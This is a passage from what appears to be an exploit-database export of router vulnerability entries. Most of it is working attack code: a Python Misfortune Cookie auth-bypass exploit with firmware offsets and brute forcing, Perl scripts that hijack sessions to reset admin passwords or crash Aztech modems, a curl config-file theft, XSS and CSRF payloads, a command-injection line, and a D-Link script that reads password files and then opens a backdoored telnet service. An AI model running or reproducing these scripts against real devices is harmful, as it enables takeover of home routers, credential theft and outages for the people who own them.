print ""usage: python "" + sys.argv[0] + "" url [enable]""
exit()
targets = [
[""AzmoonAZ-D140W2.11.89.0(RE2.C29)3.11.11.52_PMOFF.1"",107367693,13], # 0x803D5A79# tested
[""BillionBiPAC 5102SAv2.7.0.23 (UE0.B1C)"",107369694,13], # 0x8032204d# ----------
[""BillionBiPAC 5102SBv2.7.0.23 (UE0.B1C)"",107369694,13], # 0x8032204d# ----------
[""BillionBiPAC 52002.11.84.0(UE2.C2)3.11.11.6"",107369545,9], # 0x803ec2ad# ----------
[""BillionBiPAC 52002_11_62_2_ UE0.C2D_3_10_16_0"",107371218,21], # 0x803c53e5# ----------
[""BillionBiPAC 5200A2_10_5 _0(RE0.C2)3_6_0_0"",107366366,25], # 0x8038a6e1# ----------
[""BillionBiPAC 5200A2_11_38_0 (RE0.C29)3_10_5_0"",107371453,9], # 0x803b3a51# ----------
[""BillionBiPAC 5200GR42.11.91.0(RE2.C29)3.11.11.52"",107367690,21], # 0x803D8A51# tested
[""BillionBiPAC 5200S2.10.5.0 (UE0.C2C) 3.6.0.0"",107368270,1], # 0x8034b109# ----------
[""BillionBiPAC 5200SRD2.12.17.0_UE2.C3_3.12.17.0"",107371378,37], # 0x8040587d# ----------
[""BillionBiPAC 5200SRD2_11_62_2(UE0.C3D)3_11_11_22"",107371218,13], # 0x803c49d5# ----------
[""D-LinkDSL-2520UZ11.08 DSL-2520U_RT63261_Middle_East_ADSL"",107368902,25], # 0x803fea01# tested
[""D-LinkDSL-2600UZ1DSL-2600U HWZ1"",107366496,13], # 0x8040637d# ----------
[""D-LinkDSL-2600UZ2V1.08_ras"",107360133,20], # 0x803389B0# ----------
[""TP-LinkTD-8616V2TD-8616_v2_080513"",107371483,21], # 0x80397055# ----------
[""TP-LinkTD-8816V4TD-8816_100528_Russia"",107369790,17], # 0x803ae0b1# ----------
[""TP-LinkTD-8816V4TD-8816_V4_100524"",107369790,17], # 0x803ae0b1# ----------
[""TP-LinkTD-8816V5TD-8816_100528_Russia"",107369790,17], # 0x803ae0b1# ----------
[""TP-LinkTD-8816V5TD-8816_V5_100524"",107369790,17], # 0x803ae0b1# tested
[""TP-LinkTD-8816V5TD-8816_V5_100903"",107369790,17], # 0x803ae0b1# ----------
[""TP-LinkTD-8816V6TD-8816_V6_100907"",107371426,17], # 0x803c6e09# ----------
[""TP-LinkTD-8816V7TD-8816_V7_111103"",107371161,1], # 0x803e1bd5# ----------
[""TP-LinkTD-8816V7TD-8816_V7_130204"",107370211,5], # 0x80400c85# ----------
[""TP-LinkTD-8817V5TD-8817_V5_100524"",107369790,17], # 0x803ae0b1# ----------
[""TP-LinkTD-8817V5TD-8817_V5_100702_TR"",107369790,17], # 0x803ae0b1# ----------
[""TP-LinkTD-8817V5TD-8817_V5_100903"",107369790,17], # 0x803ae0b1# ----------
[""TP-LinkTD-8817V6TD-8817_V6_100907"",107369788,1], # 0x803b6e09# ----------
[""TP-LinkTD-8817V6TD-8817_V6_101221"",107369788,1], # 0x803b6e09# ----------
[""TP-LinkTD-8817V7TD-8817_V7_110826"",107369522,25], # 0x803d1bd5# ----------
[""TP-LinkTD-8817V7TD-8817_V7_130217"",107369316,21], # 0x80407625# ----------
[""TP-LinkTD-8817V7TD-8817_v7_120509"",107369321,9], # 0x803fbcc5# tested
[""TP-LinkTD-8817V8TD-8817_V8_140311"",107351277,20], # 0x8024E148# GrantWillcox
[""TP-LinkTD-8820V3TD-8820_V3_091223"",107369768,17], # 0x80397E69# Chan
[""TP-LinkTD-8840T V1TD-8840T_080520"",107369845,5], # 0x80387055# ----------
[""TP-LinkTD-8840T V2TD-8840T_V2_100525"",107369790,17], # 0x803ae0b1# tested
[""TP-LinkTD-8840T V2TD-8840T_V2_100702_TR"",107369790,17], # 0x803ae0b1# ----------
[""TP-LinkTD-8840T V2TD-8840T_v2_090609"",107369570,1], # 0x803c65d5# ----------
[""TP-LinkTD-8840T V3TD-8840T_V3_101208"",107369766,17], #0x803c3e89# tested
[""TP-LinkTD-8840T V3TD-8840T_V3_110221"",107369764,5], # 0x803d1a09# ----------
[""TP-LinkTD-8840T V3TD-8840T_V3_120531"",107369688,17], # 0x803fed35# ----------
[""TP-LinkTD-W8101G V1TD-W8101G_090107"",107367772,37], # 0x803bf701# ----------
[""TP-LinkTD-W8101G V1TD-W8101G_090107"",107367808,21], # 0x803e5b6d# ----------
[""TP-LinkTD-W8101G V2TD-W8101G_V2_100819"",107367751,21], # 0x803dc701# ----------
[""TP-LinkTD-W8101G V2TD-W8101G_V2_101015_TR"",107367749,13], # 0x803e1829# ----------
[""TP-LinkTD-W8101G V2TD-W8101G_V2_101101"",107367749,13], # 0x803e1829# ----------
[""TP-LinkTD-W8101G V3TD-W8101G_V3_110119"",107367765,25], # 0x804bb941# ----------
[""TP-LinkTD-W8101G V3TD-W8101G_V3_120213"",107367052,25], # 0x804e1ff9# ----------
[""TP-LinkTD-W8101G V3TD-W8101G_V3_120604"",107365835,1], # 0x804f16a9# ----------
[""TP-LinkTD-W8151NV3TD-W8151N_V3_120530"",107353867,24], # 0x8034F3A4# tested
[""TP-LinkTD-W8901GV1TD-W8901G_080522"",107367787,21], # 0x803AB30D# Piotr Bania
[""TP-LinkTD-W8901GV1,2TD-W8901G_080522"",107368013,5], # 0x803AB30D# ----------
[""TP-LinkTD-W8901GV2TD-W8901G_090113_Turkish"",107368013,5], # 0x803AB30D# ----------
[""TP-LinkTD-W8901GV3TD-W8901G(UK)_V3_140512"",107367854,9], # 0x803cf335# tested
[""TP-LinkTD-W8901GV3TD-W8901G_V3_100603"",107367751,21], # 0x803DC701# chan
[""TP-LinkTD-W8901GV3TD-W8901G_V3_100702_TR"",107367751,21], # 0x803DC701# tested
[""TP-LinkTD-W8901GV3TD-W8901G_V3_100901"",107367749,13], # 0x803E1829# tested
[""TP-LinkTD-W8901GV6TD-W8901G_V6_110119"",107367765,25], # 0x804BB941# Chan
[""TP-LinkTD-W8901GV6TD-W8901G_V6_110915"",107367682,21], # 0x804D7CB9# Chan
[""TP-LinkTD-W8901G V6TD-W8901G_V6_120418"",107365835,1], # 0x804F16A9# ----------
[""TP-LinkTD-W8901G V6 TD-W8901G_V6_120213"",107367052,25], # 0x804E1FF9# ----------
[""TP-LinkTD-W8901GBV3TD-W8901GB_V3_100727"",107367756,13], # 0x803dfbe9# ----------
[""TP-LinkTD-W8901GBV3TD-W8901GB_V3_100820"",107369393,21], # 0x803f1719# ----------
[""TP-LinkTD-W8901NV1TD-W8901N v1_111211"",107353880,0],  # 0x8034FF94# cawanChui
[""TP-LinkTD-W8951NDV1TD-TD-W8951ND_V1_101124,100723,100728"",107369839,25], # 0x803d2d61# tested
[""TP-LinkTD-W8951NDV1TD-TD-W8951ND_V1_110907"",107369876,13], # 0x803d6ef9 # ----------
[""TP-LinkTD-W8951NDV1TD-W8951ND_V1_111125"",107369876,13], # 0x803d6ef9# ----------
[""TP-LinkTD-W8951NDV3TD-W8951ND_V3.0_110729_FI"",107366743,21], # 0x804ef189# ----------
[""TP-LinkTD-W8951NDV3TD-W8951ND_V3_110721"",107366743,21], # 0x804ee049# ----------
[""TP-LinkTD-W8951NDV3TD-W8951ND_V3_20110729_FI"",107366743,21], # 0x804ef189# ----------
[""TP-LinkTD-W8951NDV4TD-W8951ND_V4_120511"",107364759,25],  # 0x80523979# tested
[""TP-LinkTD-W8951NDV4TD-W8951ND_V4_120607"",107364759,13], # 0x80524A91# tested
[""TP-LinkTD-W8951NDV4TD-W8951ND_v4_120912_FL"",107364760,21], # 0x80523859# tested
[""TP-LinkTD-W8961NBV1TD-W8961NB_V1_110107"",107369844,17], # 0x803de3f1# tested
[""TP-LinkTD-W8961NBV1TD-W8961NB_V1_110519"",107369844,17], # 0x803de3f1# ----------
[""TP-LinkTD-W8961NBV2TD-W8961NB_V2_120319"",107367629,21], # 0x80531859# ----------
[""TP-LinkTD-W8961NBV2TD-W8961NB_V2_120823"",107366421,13], # 0x80542e59# ----------
[""TP-LinkTD-W8961NDV1TD-W8961ND_V1_100722,101122"",107369839,25], # 0x803D2D61# tested
[""TP-LinkTD-W8961NDV1TD-W8961ND_V1_101022_TR"",107369839,25], # 0x803D2D61# ----------
[""TP-LinkTD-W8961NDV1TD-W8961ND_V1_111125"",107369876,13], # 0x803D6EF9# ----------
[""TP-LinkTD-W8961NDV2TD-W8961ND_V2_120427"",107364732,25], # 0x8052e0e9# ----------
[""TP-LinkTD-W8961NDV2TD-W8961ND_V2_120710_UK"",107364771,37], # 0x80523AA9# ----------
[""TP-LinkTD-W8961NDV2TD-W8961ND_V2_120723_FI"",107364762,29], # 0x8052B6B1# ----------
[""TP-LinkTD-W8961NDV3TD-W8961ND_V3_120524,120808"",107353880,0], # 0x803605B4# ----------
[""TP-LinkTD-W8961NDV3TD-W8961ND_V3_120830"",107353414,36], # 0x803605B4# ----------
[""ZyXELP-660R-T3V33.40(BOQ.0)C0"",107369567,21], # 0x803db071# tested
[""ZyXELP-660RU-T3V33.40(BJR.0)C0"",107369567,21], # 0x803db071# ----------
def request(num,n,data):
try:
print ""\nConnecting to: "" + url + ""\n""
s.headers.update({""Cookie"":""C"" + str(num) + ""="" + ""B""* n + data + "";""})
r = s.get(url)
print str(r.status_code) + ""\n""
for i in r.headers:
print i + "": "" + r.headers[i]
return [r.status_code,r.text]
except Exception, e:
return 1000
def printMenu():
print """"""
__  __ _      __            _
|  \/  (_)___ / _| ___  _ __| |_ _   _ _ __   ___
| |\/| | / __| |_ / _ \| '__| __| | | | '_ \ / _ \
| |  | | \__ \  _| (_) | |  | |_| |_| | | | |  __/
|_|  |_|_|___/_|  \___/|_|   \__|\__,_|_| |_|\___|
____            _    _        _____            _       _ _
/ ___|___   ___ | | _(_) ___  | ____|_  ___ __ | | ___ (_) |_
| |   / _ \ / _ \| |/ / |/ _ \ |  _| \ \/ / '_ \| |/ _ \| | __|
| |__| (_) | (_) |   <| |  __/ | |___ >  <| |_) | | (_) | | |_
\____\___/ \___/|_|\_\_|\___| |_____/_/\_\ .__/|_|\___/|_|\__|
for k,i in enumerate(targets):
print str(k+1) + ""- "" + i[0]
print """"""
0- Not sure just try them all! (may cause reboot)
T- Test misfortune cookie vulnerablity against target
B- BruteForce to find auth-remover cookie (may cause reboot)
c = 0
while True:
selection = raw_input(""select a target: "")
if selection == ""T"":
return MODE_TEST
elif selection == ""B"":
return MODE_BRUTE_FORCE
c = int(selection)
if c <= len(targets):
break
else:
print ""bad input try again""
return c - 1
def bruteforce():
for i in range(107364000,107380000):
for j in range(0,40):
print ""testing "" + str(i) + "" , "" + str(j)
result = request(i,j,""\x00"")[0]
if result <= 302:
print ""YEAHHH!!!!""
print str(i) + "" , "" + str(j) + "" is the answer!""
return
elif result == 1000:
time.sleep(60)
def exploit():
c = printMenu()
if c < 0:
for k,i in enumerate(targets):
print ""testing #"" + str(k+1) + "" ...""
result = request(i[1],i[2],auth_byte)[0]
if result == 1000:
print ""\n[!] Error. maybe router crashed by sending wrong cookie or it's your connection problem.waiting 60 seconds for router to reboot""
time.sleep(60)
elif result <= 302:
print ""\n[!] Seems good but check "" + url + "" using your browser to verify if authentication is disabled or not.""
break # some routers always return 200 (for custom login page). so maybe we should comment this line
else:
print ""\n[!] Failed.""
else:
if c == MODE_TEST:
if ""HelloWorld"" in request(107373883,0,""/HelloWorld"")[1]:
print ""\n[!] Target is vulnerable""
else:
print ""\n[!] Target is not vulnerable""
elif c == MODE_BRUTE_FORCE:
bruteforce()
elif request(targets[c][1],targets[c][2],auth_byte)[0] > 302:
print ""\n[!] Failed.""
else:
print ""\n[!] Seems good but check "" + url + "" using your browser to verify if authentication is disabled or not.""
exploit()"
2016-02-03,WebApps,Hardware,Portcullis,Viprinet Multichannel VPN Router 300,Persistent Cross-Site Scripting,"http://<host>/exec?module=config&sessionid=<sessionid>&inspect=%3Cscript%20src=http://localhost:9090%3E%3C/script%3E
http://<host>/exec?tool=atcommands&sessionid=<sessionid>&sourceobject=WANINTERFACELIST.OBJECT__0&module=configtools&commands=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
http://<host>/exec?tool=ping&sessionid=<sessionid>&sourceobject=WANINTERFACELIST.OBJECT__0&module=configtools&host=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pingcount=3&databytes=56
https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2045/","Vulnerability title: Multiple Instances Of Cross-site Scripting In Viprinet Multichannel VPN Router 300
CVE: CVE-2014-2045
Vendor: Viprinet
Product: Multichannel VPN Router 300
Affected version: 2013070830/2013080900
Fixed version: 2014013131/2014020702
Reported by: Tim Brown
Details:
The data supplied to both the `old’ and `new’ web applications (the device has two web based management interfaces) was permanently stored and could be retrieved later by other users. This is a normal feature of many applications, however, in this instance the application failed to restrict the type of data that could be stored and also failed to sanitise it, meaning that it could not be safely rendered by the browser.
Stored cross-site scripting could be triggered by:
Attempting to login with a username of `<script>alert(1)</script>’ (affects `old’ interface and results in post-authentication cross-site Scripting when a legitimate administrator views the realtime log)
Creating an account with a username of `<script>alert(1)</script>’ (affects both `old’ and `new’ interfaces once created)
Setting the device’s hostname to `<script>alert(1)</script>’  (affects `old’ interface once created)
A number of locations were identified as being vulnerable to reflective attacks, including:
The inclusion of session IDs in all URLs partially mitigates the reflective cross-site scripting but could itself be considered a vulnerability since it is included in referred headers and log files.
These are simply some examples of how this attack might be performed, and the it is believed that both the `old’ and `new’ web applications are systemically vulnerable to this.
Further details at:
Copyright:
Copyright (c) Portcullis Computer Security Limited 2015, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.
Disclaimer:
The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information."
2014-09-15,Remote,Hardware,Eric Fajardo,Aztech Modem Routers,Session Hijacking,"source: https://www.securityfocus.com/bid/69811/info
#!/usr/bin/perl
# Title: Aztech Modem Broken Session Management Exploit
# Author: Eric Fajardo - fjpfajardo@ph.ibm.com
# A successful authentication of a privilege (admin) ID in the
# web portal allows any attacker in the network to hijack and
# reuse the existing session in order to trick and allow the web
# server to execute administrative commands. The command may be
# freely executed from any terminal in the network as long as
# the session of the privilege ID is valid. The below PoC shows
# an un-authenticated request to the web server for an administrator
# and user password reset.
# This exploit was tested working with the following modems:
# - DSL5018EN(1T1R) from Globe Telecom
# - DSL705E
# - DSL705EU","Multiple Aztech Modem Routers are prone to a session-hijacking vulnerability.
An attacker can exploit this issue to gain unauthorized access to the affected device.
use strict;
use IO::Socket;
if(!defined($ARGV[0])) {
system ('clear');
print ""---------------------------------------------\n"";
print ""++ Aztech Modem Broken Session Management Exploit\n"";
print ""++ Usage: perl $0 TARGET:PORT NEWPASSWORD\n"";
print ""++ Ex: perl $0 192.168.254.254:80 h4rh4rHaR\n\n"";
exit;
my $TARGET = $ARGV[0];
my $NEWPASS = $ARGV[1];
my ($HOST, $PORT)= split(':',$TARGET);
my $PATH = ""/cgi-bin/admAccess.asp"";
system ('clear');
print ""---------------------------------------------\n"";
print ""++ Sending POST string to $TARGET ...\n"";
my $PAYLOAD = ""saveFlag=1&adminFlag=1&SaveBtn=SAVE&uiViewTools_Password=$NEWPASS&uiViewTools_PasswordConfirm=$NEWPASS&uiViewTools_Password1=$NEWPASS&uiViewTools_PasswordConfirm1=$NEWPASS"";
my $POST = ""POST $PATH HTTP/1.1"";
my $ACCEPT = ""Accept: text/html, application/xhtml+xml, */*"";
my $REFERER = ""Referer: http://$HOST/cgi-bin/admAccess.asp"";
my $LANG = ""Accept-Language: en-US"";
my $AGENT = ""User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"";
my $CONTYPE = ""Content-Type: application/x-www-form-urlencoded"";
my $ACENCODING = ""Accept-Encoding: gzip, deflate"";
my $PROXYCONN = ""Proxy-Connection: Keep-Alive"";
my $CONNLENGTH = ""Content-Length: 179"";
my $DNT = ""DNT: 1"";
my $TARGETHOST = ""Host: $HOST"";
my $PRAGMA = ""Pragma: no-cache"";
my $sock = new IO::Socket::INET ( PeerAddr => ""$HOST"",PeerPort => ""$PORT"",Proto => ""tcp""); die ""[-] Can't creat socket: $!\n"" unless $sock;
print $sock ""$POST\n"";
print $sock ""$ACCEPT\n"";
print $sock ""$REFERER\n"";
print $sock ""$LANG\n"";
print $sock ""$AGENT\n"";
print $sock ""$CONTYPE\n"";
print $sock ""$ACENCODING\n"";
print $sock ""$PROXYCONN\n"";
print $sock ""$CONNLENGTH\n"";
print $sock ""$DNT\n"";
print $sock ""$TARGETHOST\n"";
print $sock ""$PRAGMA\n\n"";
print $sock ""$PAYLOAD\n"";
print ""++ Sent. Connect to the web URL http://$HOST with user:admin password:$NEWPASS\n"";
$sock->close();
exit;"
2014-09-15,DoS,Hardware,Federick Joe P Fajardo,Aztech Routers,'/cgi-bin/AZ_Retrain.cgi' Denial of Service,"source: https://www.securityfocus.com/bid/69809/info
#!/usr/bin/perl","Multiple Aztech routers are prone to a denial-of-service vulnerability.
Attackers may exploit this issue to cause an affected device to crash, resulting in a denial-of-service condition.
Aztech DSL5018EN, DSL705E and DSL705EU are vulnerable.
use strict;
use IO::Socket;
if(!defined($ARGV[0])) {
system ('clear');
print ""---------------------------------------------\n"";
print ""++ Aztech Modem Denial of Service Attack\n"";
print ""++ Usage: perl $0 TARGET:PORT\n"";
print ""++ Ex: perl $0 192.168.254.254:80\n\n"";
exit;
my $TARGET = $ARGV[0];
my ($HOST, $PORT)= split(':',$TARGET);
my $PATH = ""%2f%63%67%69%2d%62%69%6e%2f%41%5a%5f%52%65%74%72%61%69%6e%2e%63%67%69"";
system ('clear');
print ""---------------------------------------------\n"";
print ""++ Resetting WAN modem $TARGET\n"";
my $POST = ""GET $PATH HTTP/1.1"";
my $ACCEPT = ""Accept: text/html"";
my $sock = new IO::Socket::INET ( PeerAddr => ""$HOST"",PeerPort => ""$PORT"",Proto => ""tcp""); die ""[-] Can't creat socket: $!\n"" unless $sock;
print $sock ""$POST\n"";
print $sock ""$ACCEPT\n\n"";
print ""++ Sent. The modem should be disconnected by now.\n"";
$sock->close();
exit;"
2014-09-15,Remote,Hardware,Eric Fajardo,Aztech Modem Routers,Information Disclosure,source: https://www.securityfocus.com/bid/69808/info,"Aztech Modem Routers are prone to an information-disclosure vulnerability.
An attacker can exploit this issue to gain access to sensitive information; this may lead to further attacks.
HOST=$1
PORT=$2
PARM1=""\x48\x6f\x73\x74\x3a\x20""
PARM2=""\x50\x72\x6f\x78\x79\x2d\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x6b\x65\x65\x70\x2d\x61\x6c\x69\x76\x65""
PARM3=""\x41\x63\x63\x65\x70\x74\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x68\x74\x6d\x6c\x2b\x78\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x6d\x6c\x3b\x71\x3d\x30\x2e\x39\x2c\x69\x6d\x61\x67\x65\x2f\x77\x65\x62\x70\x2c\x2a\x2f\x2a\x3b\x71\x3d\x30\x2e\x38""
PARM4=""\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x33\x37\x2e\x30\x2e\x32\x30\x36\x32\x2e\x31\x30\x33\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36""
PARM5=""\x52\x65\x66\x65\x72\x65\x72\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x61\x64\x6d\x53\x65\x74\x74\x69\x6e\x67\x73\x2e\x61\x73\x70""
PARM6=""\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x64\x65\x66\x6c\x61\x74\x65\x2c\x73\x64\x63\x68""
PARM7=""\x41\x63\x63\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x55\x53\x2c\x65\x6e\x3b\x71\x3d\x30\x2e\x38""
NARGS=1
BARGS=65
main() {
printf ""\---------------------------------------------\n"";
printf ""++ Aztech Modem Get Configuration File Exploit\n"";
printf ""++ Usage: $0 TARGET PORT\n"";
printf ""++ Ex: $0 192.168.254.254 80\n\n"";
[[ $# -le $NARGS ]] && main && exit $BARGS
curl -i -H ""$PARM1"" \
-H ""$PARM2"" \
-H ""$PARM3"" \
-H ""$PARM4"" \
-H ""$PARM5"" \
-H ""$PARM6"" \
-H ""$PARM7"" http://www.example.com:$PORT/%63%67%69%2d%62%69%6e%2f%75%73%65%72%72%6f%6d%66%69%6c%65%2e%63%67%69 > romfile.cfg"
2014-05-30,Remote,Hardware,Benjamin Daniel Mussler,Huawei E303 Router,Cross-Site Request Forgery,source: https://www.securityfocus.com/bid/67747/info,"Huawei E303 Router is prone to a cross-site request-forgery vulnerability.
Exploiting this issue may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks.
Huawei E303 Router running firmware versions CH2E303SM is vulnerable; other versions may also be affected.
[Proof -of-concept HTTP POST request]:
POST /api/sms/send-sms HTTP/1.1
Host: hi.link
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.8,de-de;q=0.5,de;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://hi.link/
Connection: keep-alive
Content-Type: text/plain
Content-Length: 225
<?xml version=""1.0""
encoding=""UTF-8""?><request><Index>-1</Index><Phones><Phone>4422</Phone></Phones><Sca></Sca><Content>
Sample Text</Content><Length>0</Length><Reserved>1</Reserved><Date>2013-12-03
16:00:00</Date></request>"
2014-04-21,Remote,Hardware,TUNISIAN CYBER,COMTREND CT-5361T Router,'Password.cgi' Cross-Site Request Forgery (Admin Password Manipulation),"source: https://www.securityfocus.com/bid/67033/info
http://www.example.com/password.cgi?sysPassword=[Your Password]","Comtrend CT-5361T ADSL Router is prone to a cross-site scripting vulnerability and a cross-site request-forgery vulnerability.
An attacker can exploit these vulnerabilities to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, add, delete or modify sensitive information, or perform unauthorized actions. Other attacks are also possible.
Comtrend CT-5361T firmware version A111-312SSG-T02_R01 is vulnerable; other versions may also be affected."
2014-02-03,Remote,CGI,Josue Rojas,Seowon Intech WiMAX SWC-9100 Router,'/cgi-bin/diagnostic.cgi?ping_ipaddr' Remote Code Execution,source: https://www.securityfocus.com/bid/65306/info,"WiMAX SWC-9100 Mobile Router is prone to a security-bypass vulnerability and a command-injection vulnerability.
Exploiting these issues could allow an attacker to bypass certain security restrictions or execute arbitrary commands in the context of the device.
curl -v --data ""select_mode_ping=on&ping_ipaddr=127.0.0.1>/dev/null; ls
-lash /etc%23&ping_count=1&action=Apply&html_view=ping""
""http://www.example.com/cgi-bin/diagnostic.cgi"" > /dev/null"
2014-02-03,DoS,CGI,Josue Rojas,Seowon Intech WiMAX SWC-9100 Router,'/cgi-bin/reboot.cgi' Remote Reboot (Denial of Service),"source: https://www.securityfocus.com/bid/65306/info
http://www.example.com/cgi-bin/reboot.cgi?select_option_value=factory_default&reboot_option=on&action=Apply
http://www.example.com/cgi-bin/reboot.cgi?select_option_value=default_reboot&reboot_option=on&action=Apply","WiMAX SWC-9100 Mobile Router is prone to a security-bypass vulnerability and a command-injection vulnerability.
Exploiting these issues could allow an attacker to bypass certain security restrictions or execute arbitrary commands in the context of the device."
2013-12-02,WebApps,Hardware,tytusromekiatomek,D-Link DIR-Series Routers,'/model/__show_info.php' Local File Disclosure,"source: https://www.securityfocus.com/bid/64043/info
#!/bin/sh","Multiple D-Link DIR series routers are prone to a local file-disclosure vulnerability because it fails to adequately validate user-supplied input.
Exploiting this vulnerability would allow an attacker to obtain potentially sensitive information from local files on devices running the vulnerable application. This may aid in further attacks.
if [ -z ""$1"" ]; then
echo ""d-link DIR-300 (all), DIR-600 (all), DIR-615 (fw 4.0)"";
echo ""exploited by AKAT-1, 22733db72ab3ed94b5f8a1ffcde850251fe6f466, c8e74ebd8392fda4788179f9a02bb49337638e7b"";
echo ""usage: $0 [router address] [telnet port]"";
exit 0;
fi;
if [ -z ""$2"" ]; then
TPORT=3333;
else
TPORT=$2;
fi
UPORT=31337;
echo ""Trying $1 ..."";
HTTPASSWD=`curl -sS ""http://$1/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd""; | grep -A1 ""<center>"" | tail -1 |
sed -e ""s/\t//g ; s/^\([^:]*\):\([^:]*\)$/\1\n \2/g""`;
if [ ! -z ""$HTTPASSWD"" ]; then
L=`echo $HTTPASSWD | cut -d' ' -f1`;
P=`echo $HTTPASSWD | cut -d' ' -f2`;
echo ""found username: $L"";
echo ""found password: $P"";
curl -d ""ACTION_POST=LOGIN&LOGIN_USER=$L&LOGIN_PASSWD=$P"" -sS ""http://$1/login.php""; | grep -v ""fail""
1>/dev/null;
if [ $? -eq 0 ]; then
curl -sS
""http://$1/tools_system.xgi?random_num=2011.9.22.13.59.33&exeshell=../../../../usr/sbin/iptables -t nat -A PRE_MISC -i
eth0.2 -p tcp --dport $TPORT -j ACCEPT&set/runtime/syslog/sendmail=1"" 1>/dev/null;
curl -sS
""http://$1/tools_system.xgi?random_num=2011.9.22.13.59.33&exeshell=../../../../usr/sbin/iptables -t nat -A PRE_MISC -i
eth0.2 -p tcp --dport $UPORT -j ACCEPT&set/runtime/syslog/sendmail=1"" 1>/dev/null;
curl -sS
""http://$1/tools_system.xgi?random_num=2011.9.22.13.59.33&exeshell=../../../../usr/sbin/telnetd -p $TPORT -l
/usr/sbin/login -u hacked:me&set/runtime/syslog/sendmail=1"" 1>/dev/null;
echo ""if you are lucky telnet is listening on $TPORT (hacked:me) ...""
curl -sS ""http://$1/logout.php""; 1>/dev/null;
fi
fi
CHAP=`curl -sS ""http://$1/model/__show_info.php?REQUIRE_FILE=/etc/ppp/chap-secrets""; | grep -A1 ""<center>"" | sed -e
""s/<center>//g""`;
if [ ! -z ""$CHAP"" ]; then
echo ""found chap-secrets: $CHAP"";
fi
echo ""Bye bye."";
exit 0;"
2013-11-15,Remote,Hardware,Yakir Wizman,LevelOne WBR-3406TX Router,Cross-Site Request Forgery,source: https://www.securityfocus.com/bid/63908/info,"LevelOne WBR-3406TX router is prone to a cross-site request-forgery vulnerability.
Attackers can exploit this issue to perform certain administrative actions and gain unauthorized access to the affected device.
<html>
<body>
<form action=""http://www.example.com/cgi-bin/pass"" method=""POST"">
<input type=""hidden"" name=""rc"" value=""@"" />
<input type=""hidden"" name=""Pa"" value=""1234567"" />
<input type=""hidden"" name=""P1"" value=""1234567"" />
<input type=""hidden"" name=""rd"" value=""atbox"" />
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>"
2015-12-01,WebApps,Hardware,Rahul Pratap Singh,Belkin N150 Wireless Router F9K1009 v1,Multiple Vulnerabilities,"##Full Disclosure:
#Exploit Title      : Belkin N150 Wireless Home Router Multiple
#Exploit Author     : Rahul Pratap Singh
#Date               : 30/Nov/2015
#Home Page Link     : http://www.belkin.com
#Blog Url           : 0x62626262.wordpress.com
#Linkedin           : https://in.linkedin.com/in/rahulpratapsingh94
#Status             : Not Patched
https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities/
http://192.168.2.1/cgi-bin/webproc?getpage=html/page.html&var:page=deviceinfo&var:oldpage=-
http://192.168.2.1/cgi-bin/webproc?getpage=html/page.html&var:page=deviceinfo&var:oldpage=-
https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities/
https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities/","Vulnerabilities
→ Vulnerability/BUG Report :
1)
• Vulnerability Title  :  HTML/Script Injection
• Version              :  F9K1009 v1
• Firmware             :  1.00.09
→ Proof of Concept:
""InternetGatewayDevice.DeviceInfo.X_TWSZ-COM_Language"" this parameter is
vulnerable.
→ Steps to Reproduce:
Send the following post request using Burpsuite,etc
POST /cgi-bin/webproc HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:35.0) Gecko/20100101
Firefox/35.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer:
Cookie: sessionid=7cf2e9c5; auth=ok; expires=Sun, 15-May-2102 01:45:46 GMT
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 260
